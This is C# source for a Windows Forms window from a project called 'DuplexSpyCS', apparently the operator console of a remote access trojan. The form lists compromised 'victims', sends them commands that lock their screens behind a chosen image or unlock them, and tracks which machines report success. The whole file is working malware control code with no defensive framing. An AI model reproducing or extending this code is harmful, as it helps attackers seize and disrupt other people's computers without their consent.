using OpenCvSharp;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Entity.Core.Metadata.Edm;
using System.Drawing;
using System.Linq;
using System.Linq.Expressions;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiLockScreen : Form
    {
        public List<clsVictim> m_lsVictim { get; init; }

        public frmMultiLockScreen(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;

            Text = $"MultiLockScreen[{m_lsVictim.Count}]";
            StartPosition = FormStartPosition.CenterScreen;
        }

        private ListViewItem lviFindItemWithVictim(clsVictim v)
        {
            ListViewItem item = null;

            Invoke(new Action(() =>
            {
                foreach (ListViewItem x in listView1.Items)
                {
                    if ((clsVictim)x.Tag == v)
                    {
                        item = x;
                        break;
                    }
                }
            }));

            return item;
        }

        private void fnRecv(clsListener listener, clsVictim victim, List<string> cmd)
        {
            if (!m_lsVictim.Contains(victim))
                return;

            if (cmd[0] == "fun")
            {
                if (cmd[1] == "screen")
                {
                    if (cmd[2] == "lock")
                    {
                        int code = int.Parse(cmd[3]);
                        ListViewItem item = lviFindItemWithVictim(victim);
                        if (item == null)
                        {
                            MessageBox.Show("lviFindItemWithVictim() returns NULL.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        Invoke(new Action(() =>
                        {
                            item.SubItems[2].Text = code == 0 ? "Unlock" : "OK";
                        }));
                    }
                }
            }
        }

        public void UpdateStatus(clsVictim v, string status)
        {
            Invoke(new Action(() =>
            {
                ListViewItem item = listView1.FindItemWithText(v.ID);
                if (item != null)
                {
                    item.SubItems[2].Text = status;
                }
            }));
        }

        void setup()
        {
            //clsStore.listener.ReceivedDecoded += Received;

            for (int i = 0; i < m_lsVictim.Count; i++)
            {
                ListViewItem item = new ListViewItem(i.ToString());
                item.SubItems.Add(m_lsVictim[i].ID);
                item.SubItems.Add("Unlock");
                item.Tag = m_lsVictim[i];

                listView1.Items.Add(item);

                m_lsVictim[i].m_listener.ReceivedDecoded += fnRecv;
            }

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
        }

        private void frmMultiLockScreen_Load(object sender, EventArgs e)
        {
            setup();
        }

        //SELECT
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            ofd.Filter = "Image file(*.png;*.jpg)|*.png;*.jpg";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        //LOCK
        private void button2_Click(object sender, EventArgs e)
        {
            string szFileName = textBox1.Text;
            if (!File.Exists(szFileName))
            {
                MessageBox.Show("Cannot find image file: " + szFileName, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            List<clsVictim> lsVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
            if (lsVictim.Count == 0)
            {
                MessageBox.Show("Please check a item!", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            string szImageBase64 = clsTools.ImageToBase64(szFileName);

            foreach (var v in lsVictim)
            {
                v.SendCommand("fun|screen|lock|" + szImageBase64);
            }
        }

        //UNLOCK
        private void button3_Click(object sender, EventArgs e)
        {
            string szFileName = textBox1.Text;
            if (!File.Exists(szFileName))
            {
                MessageBox.Show("Cannot find image file: " + szFileName, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            List<clsVictim> lsVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
            if (lsVictim.Count == 0)
            {
                MessageBox.Show("Please check a item!", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            string szImageBase64 = clsTools.ImageToBase64(szFileName);

            foreach (var v in lsVictim)
            {
                v.SendCommand("fun|screen|ulock");
            }
        }

        //Check All
        private void button4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck All
        private void button5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }

        private void frmMultiLockScreen_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (var victim in m_lsVictim)
                victim.m_listener.ReceivedDecoded -= fnRecv;
        }
    }
}
